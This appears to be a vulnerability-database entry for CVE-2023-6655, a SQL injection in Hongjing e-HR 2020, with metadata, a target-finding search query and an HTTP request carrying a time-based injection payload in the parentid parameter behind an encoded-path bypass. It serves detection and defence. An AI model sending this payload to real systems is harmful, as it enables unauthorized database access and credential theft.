---
layout: post
cve_id: CVE-2023-6655
title: Hongjing e-HR 2020 - SQL Injection
pcap: true
pcap_path: /pcaps/2023/CVE-2023-6655.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-6655.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pussycat0x
severity: high
impact: 'Unauthenticated attackers can execute arbitrary SQL queries via the parentid
  parameter, potentially extracting sensitive database information including user
  credentials.

  '
remediation: 'Update Hongjing e-HR to a version newer than 2020 that addresses this
  SQL injection vulnerability.

  '
reference:
- https://nvd.nist.gov/vuln/detail/CVE-2023-6655
- https://github.com/Gent5698/vulnerability/blob/main/%E5%AE%8F%E6%99%AF/CVE-2023-6655/README.md
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L
  cvss-score: 7.3
  cve-id: CVE-2023-6655
  cwe-id: CWE-89
  epss-score: 0.26772
  epss-percentile: 0.96184
  cpe: cpe:2.3:a:hrp2000:e-hr:2020:*:*:*:*:*:*:*
metadata:
  verified: true
  vendor: hrp2000
  product: e-hr
  fofa-query: title="‰∫∫ÂäõËµÑÊ∫ê‰ø°ÊÅØÁÆ°ÁêÜÁ≥ªÁªü"
tags:
- cve
- cve2023
- hjsoft
- management-system
- sqli
- vkev
- vuln
---

## üîç Vulnerability Description
A vulnerability, which was classified as critical, has been found in Hongjing e-HR 2020. Affected by this issue is some unknown functionality of the file /w_selfservice/oauthservlet/%2e./.%2e/general/inform/org/loadhistroyorgtree of the component Login Interface. The manipulation of the argument parentid leads to sql injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used. VDB-247358 is the identifier assigned to this vulnerability.


## üåê HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /w_selfservice/oauthservlet/%2e./.%2e/general/inform/org/loadhistroyorgtree?isroot=child&parentid=1%27%3BWAITFOR+DELAY+%270%3A0%3A6%27--&kind=2&catalog_id=11&issuperuser=111&manageprive=111&action=111&target HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15
Connection: close
Accept-Encoding: gzip, deflate
```

